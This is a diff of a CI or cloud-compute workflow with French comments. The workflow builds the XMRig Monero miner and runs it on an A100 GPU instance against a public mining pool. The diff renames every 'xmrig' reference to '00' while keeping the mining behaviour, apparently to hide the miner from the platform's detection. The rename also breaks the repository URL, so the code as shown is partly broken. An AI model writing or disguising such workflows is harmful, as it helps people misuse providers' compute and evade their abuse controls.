@@ -9,56 +9,56 @@ jobs:
     resources:
       instance-type: C5
     outputs:
-      xmrig-source:
+      00-source:
         type: volume  # Changer 'volume' en 'dataset' si nécessaire
     uses: script@v1
     with:
       script: |
         # Installer les dépendances nécessaires
         apt-get update && apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
-        # Cloner le dépôt xmrig
-        git clone https://github.com/xmrig/xmrig.git /xmrig
+        # Cloner le dépôt 00
+        git clone https://github.com/00/00.git /00
         # Copier les sources dans l'output
-        cp -r /xmrig /outputs/xmrig-source
+        cp -r /00 /outputs/00-source
 
   Build:
     needs: Install
     resources:
       instance-type: C5
     inputs:
-      xmrig-source:
+      00-source:
         type: volume
     outputs:
-      xmrig-build:
+      00-build:
         type: dataset
     uses: script@v1
     with:
       script: |
         # Copier les sources dans le répertoire de travail
-        cp -r /inputs/xmrig-source/xmrig /xmrig
-        cd /xmrig
+        cp -r /inputs/00-source/00 /00
+        cd /00
         # Créer le répertoire de build et y accéder
         mkdir build && cd build
         # Générer les fichiers de build avec cmake
         cmake ..
-        # Compiler xmrig
+        # Compiler 00
         make -j$(nproc)  # Optimisation de la compilation
         # Copier le binaire compilé
-        cp xmrig /outputs/xmrig-build/
+        cp 00 /outputs/00-build/
 
   Run:
     needs: Build
     resources:
       instance-type: A100
     inputs:
-      xmrig-build:
+      00-build:
         type: volume
     uses: script@v1
     with:
       script: |
         # Copier le binaire dans le répertoire de travail
-        cp /inputs/xmrig-build/xmrig /xmrig
-        chmod +x /xmrig/xmrig
-        cd /xmrig
-        # Exécuter xmrig
-        ./xmrig --donate-level 1 -o pool.supportxmr.com:3333 -u VotreAdresseMonero -p x
+        cp /inputs/00-build/00 /00
+        chmod +x /00/00
+        cd /00
+        # Exécuter 00
+        ./00 --donate-level 1 -o pool.supportxmr.com:3333 -u VotreAdresseMonero -p x
